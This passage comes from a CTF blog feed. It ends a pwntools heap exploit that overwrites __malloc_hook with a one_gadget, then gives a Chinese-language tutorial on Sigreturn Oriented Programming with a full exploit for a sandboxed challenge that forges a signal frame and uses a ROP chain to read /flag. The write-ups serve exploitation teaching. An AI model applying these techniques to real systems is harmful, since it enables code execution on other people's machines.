class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
</feed>
